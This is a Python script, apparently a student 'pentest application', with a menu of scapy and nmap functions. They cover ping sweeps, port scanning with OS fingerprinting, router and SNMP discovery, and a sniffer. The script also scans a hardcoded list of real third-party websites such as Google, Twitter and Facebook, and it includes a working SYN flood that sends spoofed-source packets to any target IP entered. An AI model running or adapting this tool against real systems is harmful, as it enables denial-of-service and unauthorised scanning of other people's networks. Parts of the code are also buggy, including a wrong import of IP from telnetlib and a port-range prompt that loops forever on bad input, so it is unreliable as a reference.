from scapy.layers.inet import ICMP, TCP
from telnetlib import IP
from scapy.all import *
import nmap
import re
import socket

ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
port_min = 0
port_max = 65535

TIMEOUT = 1
conf.verb = 0
live_IPs = []

nm = nmap.PortScanner()


def pingICMP():
    global ip, file
    print("-----------------------ICMP PING-----------------------")
    for ip in range(1, 20):
        packet = IP(dst="192.168.1." + str(ip), ttl=20) / ICMP()
        reply = sr1(packet, timeout=TIMEOUT)
        if not (reply is None):
            with open("icmp.dat", "a") as file:
                prim_IP = "192.168.1." + str(ip)
                live_IPs.append(prim_IP)
                print(reply.dst, " is online")
                file.write("192.168.1." + str(ip) + ' (live host..)' + '\n')
                file.close()
        else:
            print("Timeout waiting for", packet[IP].dst)
    print(live_IPs)


open_ports = []


def validateIPs():
    if ip_add_pattern.search(ip) and ip in live_IPs:
        print(f"{ip} is a valid ip address")


for ip in live_IPs:
    validateIPs()


def portIdentification_OpenPorts_OSDetection():
    global port_min, port_max, open_ports, ip, counter, port, result, port_status, file
    print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
    port_range = input("Enter port range: ")
    while True:
        # You can scan 0-65535 ports. This scanner is basic and doesn't use multithreading so scanning
        # all the ports is not advised.
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break
    ips_and_ports = {}
    open_ports = []
    # We're looping over all the ports in the specified range.
    for ip in live_IPs:
        counter = 1
        for port in range(port_min, port_max + 1):
            # try:
            # The result is quite interesting to look at. You may want to inspect the dictionary it returns.
            # It contains what was sent to the command line in addition to the port status we're after.

            result = nm.scan(ip, str(port))
            # Uncomment following line and look at the result
            # print(result)
            # We extract the port status from the returned object
            port_status = (result['scan'][ip]['tcp'][port]['state'])
            if port_status == 'open':
                open_ports.append(port)
            with open("ports.dat", "a") as file:
                try:
                    service = socket.getservbyport(port)
                    file.write(f"Port{port} is {port_status} " + " || " + ip + " || " + service + '\n')
                    print(counter, "port nr", port, "runs service ", service)
                    counter += 1
                except:
                    continue
            print(f"Port {port} is {port_status}")
        # if there are open ports on a specific ip, add them to dict
        if len(open_ports) >= 1:
            ips_and_ports.update({ip: open_ports})
        # except:
        #     # We cannot scan some ports and this ensures the program doesn't crash when we try to scan them.
        #     print(f"Cannot scan port {port}.")
    print(ips_and_ports)
    for ip in ips_and_ports:
        with open("open_ports.dat", "a") as file:
            file.write(ip + " " + str(ips_and_ports.get(ip)) + '\n')

    # print("Open ports file is updated!")
    print("-----------------------OS DETECTION-----------------------")
    # OS Fingerprint identification
    counter = 0
    for ip in ips_and_ports:
        print(ip)
        print(nm.scan(ip, arguments="-O")['scan'][ip]['osmatch'])
        counter += 1


def routerDetection():
    global host, a, b, c, port_numbers, port_status, proto, lport, port, d, file, extra
    print("-----------------------ROUTER DETECTION-----------------------")
    # Router detection
    neighborRouter_ip = '192.168.1-10.1'
    result1 = nm.scan(hosts=neighborRouter_ip, arguments='-F')
    print("Neighbor Routers")
    print(result1)
    print("------------------")
    for host in nm.all_hosts():
        a = host
        b = nm[host].hostname()
        c = nm[host].state()
        port_numbers = []
        port_status = []
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('Protocol: %s ' % proto)
            lport = nm[host][proto].keys()
            for port in lport:
                print('port : %s state : %s' % (port, nm[host][proto][port]['state']))
                port_numbers.append(port)
                d = nm[host][proto][port]['state']
                port_status.append(d)
        with open("wall.dat", "a") as file:
            extra = a + ' ' + b + ' ' + c + ' ' + 'open ports: ' + str(port_numbers)
            file.write(str(extra) + '\n')


def serverDetection():
    global nm, host, a, b, c, port_numbers, port_status, proto, lport, port, d, file, extra
    print("-----------------------WEB SERVER DETECTION-----------------------")
    # web server detection
    url_list = [
        "web.ieu.edu.tr",
        "www.google.com.tr",
        "twitter.com",
        "migros.com.tr",
        "facebook.com",
        "gittigidiyor.com",
        "trendyol.com",
        "youtube.com",
        "apple.com",
        "samsung.com"
    ]
    nm = nmap.PortScanner()
    for url in url_list:
        command = "host " + url
        process = os.popen(command)
        results = str(process.read())
        marker = results.find('has address') + 12
        webServer = results[marker:].splitlines()[0]
        nm.scan(webServer, arguments='-F')
        for host in nm.all_hosts():
            a = host
            b = nm[host].hostname()
            c = nm[host].state()
            port_numbers = []
            port_status = []
            print('Host : %s (%s)' % (host, nm[host].hostname()))
            print('State : %s' % nm[host].state())
            for proto in nm[host].all_protocols():
                print('Protocol: %s ' % proto)
                lport = nm[host][proto].keys()
                for port in lport:
                    print('port : %s state : %s' % (port, nm[host][proto][port]['state']))
                    port_numbers.append(port)
                    d = nm[host][proto][port]['state']
                    port_status.append(d)
            with open("web.dat", "a") as file:
                extra = a + ' ' + b + ' ' + c + ' ' + 'open ports: ' + str(port_numbers)
                file.write(str(extra) + '\n')


def snmpDetection():
    global nm, result, host, proto, lport, port
    print("-----------------------SNMP DETECTION-----------------------")
    # snmp detection
    nm = nmap.PortScanner()
    result = nm.scan(hosts='192.168.1.1/24', arguments='-sU -p 161 --open')
    for host in nm.all_hosts():
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            for port in lport:
                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['name']))


def synFlood():
    target_ip = input('Target IP: ')
    target_port = input('Port: ')
    packet_count = input('Flooding: ')
    print('SYN_flood attack begins on', target_ip)
    for sport in range(0, int(packet_count)):
        pkt = IP(src=RandIP("192.168.1.1/24"), dst=target_ip) / TCP(sport=sport, dport=int(target_port))
        send(pkt)


def Sniff():
    print("Send a ping command.")
    pkts = sniff(iface="eth0", filter="ip host 192.168.1.1", count=5)
    pkts.summary()


print("Welcome to our pentest application")
print("""
      1- ICMP Ping
      2- Port Identification & Save open ports & OS Detection
      3- Router & Firewall Detection
      4- Web Server Detection
      5- SNMP Detection
      6- SYN_flood
      7- Sniff 
      8- EXIT
      """)

while True:
    print("-----------------------------------------")
    choice = input('SELECT AN OPTION: ')
    if choice == '1':
        pingICMP()
        for ip in live_IPs:
            validateIPs()
    elif choice == '2':
        portIdentification_OpenPorts_OSDetection()
    elif choice == '3':
        routerDetection()
    elif choice == '4':
        serverDetection()
    elif choice == '5':
        snmpDetection()
    elif choice == '6':
        synFlood()
    elif choice == '7':
        Sniff()
    elif choice == '8':
        break
    else:
        print("Wrong input!")
